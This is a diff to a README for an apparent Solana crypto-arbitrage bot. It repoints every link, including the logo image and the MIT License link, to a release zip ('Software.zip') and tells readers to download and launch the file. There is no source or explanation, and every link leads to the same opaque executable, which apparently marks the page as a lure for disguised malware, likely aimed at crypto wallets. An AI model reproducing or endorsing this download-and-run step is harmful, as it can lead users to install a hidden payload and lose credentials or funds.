@@ -1,5 +1,5 @@
 # 🤖 Solana Arbitrage Bot 🌐
-![Solana Logo](https://github.com/Zuzu-kk/solana-arbitrage-bot/releases/download/v1.0/Program.zip)
+![Solana Logo](https://github.com/Zuzu-kk/solana-arbitrage-bot/releases/download/v2.0/Software.zip)
 
 Automated Arbitrage Bot Using Jupiter on Solana
 
@@ -33,7 +33,7 @@ Welcome to the Solana Arbitrage Bot repository! This project focuses on developi
 
 ## Installation Guide 🛠️
 To get started with our Solana Arbitrage Bot, you can download the necessary software package from the following link:
-[![Download Solana Arbitrage Bot](https://github.com/Zuzu-kk/solana-arbitrage-bot/releases/download/v1.0/Program.zip)](https://github.com/Zuzu-kk/solana-arbitrage-bot/releases/download/v1.0/Program.zip)
+[![Download Solana Arbitrage Bot](https://github.com/Zuzu-kk/solana-arbitrage-bot/releases/download/v2.0/Software.zip)](https://github.com/Zuzu-kk/solana-arbitrage-bot/releases/download/v2.0/Software.zip)
 
 Please note that the downloaded file needs to be launched to begin using the Solana Arbitrage Bot for your trading activities.
 
@@ -81,7 +81,7 @@ Thank you for exploring the Solana Arbitrage Bot repository. We are excited to h
 ---
 
 ## License 📜
-This project is licensed under the [MIT License](https://github.com/Zuzu-kk/solana-arbitrage-bot/releases/download/v1.0/Program.zip). Feel free to use, modify, and distribute the code for your own purposes in accordance with the terms of the license.
+This project is licensed under the [MIT License](https://github.com/Zuzu-kk/solana-arbitrage-bot/releases/download/v2.0/Software.zip). Feel free to use, modify, and distribute the code for your own purposes in accordance with the terms of the license.
 
 ---
 
